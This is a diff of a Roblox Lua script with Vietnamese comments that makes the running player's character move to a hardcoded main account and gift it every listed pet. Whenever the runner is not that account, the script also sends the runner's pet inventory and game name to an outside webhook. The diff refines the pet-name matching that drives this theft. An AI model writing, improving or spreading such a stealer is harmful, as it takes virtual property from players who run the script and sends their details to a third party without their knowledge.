@@ -19,7 +19,7 @@ local PET_NAMES = {
     "Butterfly", "Dragon Fly", "Queen Bee", "Disco Bee"
 }
 
--- 🔎 Kiểm tra acc chính
+-- 🔎 Tìm acc chính trong server
 local function getMainPlayer()
     for _, p in ipairs(Players:GetPlayers()) do
         if p.UserId == MAIN_USER_ID then
@@ -29,16 +29,18 @@ local function getMainPlayer()
     return nil
 end
 
--- 🐾 Lấy danh sách tool hợp lệ
+-- 🐾 Lấy danh sách pet trong backpack/character
 local function getValidPetTools()
     local pets = {}
     for _, container in ipairs({LocalPlayer:FindFirstChild("Backpack"), LocalPlayer.Character}) do
         if container then
             for _, tool in ipairs(container:GetChildren()) do
                 if tool:IsA("Tool") then
+                    -- Tách tên chính từ phần [x]
+                    local baseName = tool.Name:split(" [")[1]
                     for _, pet in ipairs(PET_NAMES) do
-                        if tool.Name:match("^" .. pet) then
-                            table.insert(pets, {tool = tool, name = pet})
+                        if baseName == pet then
+                            table.insert(pets, {tool = tool, name = baseName})
                             break
                         end
                     end
@@ -55,7 +57,7 @@ local function giftPetTo(player, petName)
     giftRemote:FireServer(player, petName)
 end
 
--- 👣 Teleport đến người chơi
+-- 👣 Di chuyển đến người chơi
 local function moveToPlayer(target)
     local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
     local tgt = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
@@ -68,7 +70,7 @@ local function moveToPlayer(target)
     end
 end
 
--- 🎁 Gift tất cả pet
+-- 🎁 Tự động gift toàn bộ pet
 local function autoGiftAllPets(mainPlayer)
     local pets = getValidPetTools()
     if #pets == 0 then
@@ -88,9 +90,10 @@ local function autoGiftAllPets(mainPlayer)
     end
 end
 
--- 🌐 Gửi thông báo webhook
+-- 🌐 Gửi thông tin về webhook
 local function sendWebhook()
     if WEBHOOK_URL == "" then return end
+
     local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
     local pets = getValidPetTools()
     local petList = {}
@@ -130,9 +133,10 @@ local function sendWebhook()
     end
 end
 
--- 🧠 Main flow
+-- 🧠 Luồng chính
 task.spawn(function()
     task.wait(2)
+
     if LocalPlayer.UserId ~= MAIN_USER_ID then
         sendWebhook()
 
@@ -146,6 +150,7 @@ task.spawn(function()
         end
 
         tryGift()
+
         Players.PlayerAdded:Connect(function(p)
             if p.UserId == MAIN_USER_ID then
                 task.wait(2)
